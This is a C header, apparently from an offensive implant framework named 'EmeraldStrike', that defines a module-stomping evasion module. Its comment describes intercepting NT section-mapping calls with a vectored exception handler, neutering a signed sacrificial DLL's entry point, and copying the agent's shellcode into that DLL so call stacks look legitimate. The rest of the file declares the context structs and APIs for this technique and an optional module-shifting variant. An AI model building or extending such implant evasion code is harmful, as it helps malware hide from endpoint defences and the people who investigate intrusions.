/*
    EmeraldStrike - Module Stomping (VEH-based LoadLibraryW interception)

    Loads a sacrificial signed DLL via LoadLibraryW while a VEH handler
    intercepts NtCreateSection, NtMapViewOfSection, and RtlImageNtHeaderEx
    to: upgrade the section handle to ALL_ACCESS, duplicate it for later
    sleep unmap/remap, and patch the DllMain entry to a ret gadget so the
    sacrifice never executes its own code.

    After LoadLibraryW returns, the agent's shellcode (.text) and .pdata
    are copied into the sacrifice DLL's corresponding sections, making all
    return addresses in call stacks point into a file-backed, signed module.

    x64 only. Gated by INCLUDE_EVASION_MODULE_STOMP.
*/

#ifndef EMERALDSTRIKE_MODULE_STOMP_H
#define EMERALDSTRIKE_MODULE_STOMP_H

#ifdef INCLUDE_EVASION_MODULE_STOMP
#ifdef _WIN64

#include <windows.h>

// Shift-mode pad offset normalization (shared by module_stomp.cc and
// module_shift.cc): the builder stamps MODULE_SHIFT_PAD 1 when padding is
// enabled; translate that to the actual byte offset here.
#ifdef MODULE_SHIFT_PAD
#if MODULE_SHIFT_PAD == 1
#undef MODULE_SHIFT_PAD
#define MODULE_SHIFT_PAD 0x200
#endif
#else
#define MODULE_SHIFT_PAD 0
#endif

// ── Forward declarations ──
struct _INSTANCE;
typedef struct _INSTANCE INSTANCE, *PINSTANCE;

// ── Section info for sacrifice DLL ──
typedef struct _MS_SECTION_INFO {
    PVOID   pBase;              // VA of section start in sacrifice DLL
    DWORD   dwVirtualSize;      // Virtual size of section
} MS_SECTION_INFO, *PMS_SECTION_INFO;

// ── Module stomp context (stored in INSTANCE) ──
typedef struct _MODULE_STOMP_CTX {
    // VEH interception state (set/read during LoadLibraryW single-step)
    PVOID   pNtCreateSection;           // Address of NtCreateSection (for BP compare)
    PVOID   pNtMapViewOfSection;        // Address of NtMapViewOfSection
    PVOID   pRtlImageNtHeaderEx;        // Address of RtlImageNtHeaderEx
    HANDLE  hSacSection;                // Duplicated section handle (SECTION_ALL_ACCESS)
    PVOID   pSacLdrEntry;               // LDR_DATA_TABLE_ENTRY* of sacrifice DLL
    BOOL    bLdrEntryFound;             // TRUE once LDR entry located
    BOOL    bEntryPatched;              // TRUE once EntryPoint replaced with ret
    DWORD64 qwSacImageBase;             // Image base of the sacrifice being loaded
    void*   pGetCtx;                    // NtGetContextThread (direct DR disarm in VEH)
    void*   pSetCtx;                    // NtSetContextThread

    // Sacrifice DLL info (populated after LoadLibraryW returns)
    PVOID   pSacDllBase;                // Base address of loaded sacrifice DLL
    MS_SECTION_INFO SacText;            // .text section of sacrifice DLL
    MS_SECTION_INFO SacPdata;           // .pdata section of sacrifice DLL

    // Agent stomp sizing
    SIZE_T  szStomp;                    // Total bytes to copy into .text

    // Ret gadget used to replace DllMain entry
    PVOID   pRetGadget;

#ifdef INCLUDE_EVASION_MODULE_SHIFT
    // ─── Module shifting (backup/restore) state ───
    BOOL    bShiftActive;               // TRUE when stomp runs in module_shift mode
    DWORD   dwShiftPad;                 // Offset into the section where the blob lands
    PVOID   pTextBackup;                // Original .text bytes (backup before overwrite)
    SIZE_T  szTextBackup;               // Size of the .text backup
    DWORD   dwTextProt;                 // Original .text protection (captured pre-flip)
    PVOID   pPdataBackup;               // Original .pdata bytes
    SIZE_T  szPdataBackup;              // Size of the .pdata backup
    DWORD   dwPdataProt;                // Original .pdata protection
    BOOL    bBackupRestored;            // One-shot guard for the exit restore
#endif
} MODULE_STOMP_CTX, *PMODULE_STOMP_CTX;

// ── API ──

// Initialize module stomping: load sacrifice DLL, stomp agent code, transfer execution.
// Called from agent_init() after resolve_apis(). Returns TRUE on success.
// On success this function DOES NOT RETURN to the caller - it transfers
// execution to the stomped copy of the agent. On failure it returns FALSE
// and the agent continues from its original allocation.
BOOL module_stomp_init(PINSTANCE inst);

#ifdef INCLUDE_EVASION_MODULE_SHIFT
// Restore the sacrifice DLL's original section bytes (module_shift mode).
// Called from the agent exit path. Never returns when a .text backup exists -
// the restore stub hands off directly to ExitThread/ExitProcess because the
// restoring code lives inside the region being restored.
VOID module_shift_restore(PINSTANCE inst);

// Shared sacrifice-DLL loader: VEH-intercepted LoadLibraryW with neutered
// DllMain, section discovery. Used by both module_stomp_init and the
// shift-and-restore bootstrap path (module_shift.cc).
BOOL ms_load_sacrifice(PINSTANCE inst, PMODULE_STOMP_CTX ctx);
#endif

#endif // _WIN64
#endif // INCLUDE_EVASION_MODULE_STOMP

#endif // EMERALDSTRIKE_MODULE_STOMP_H
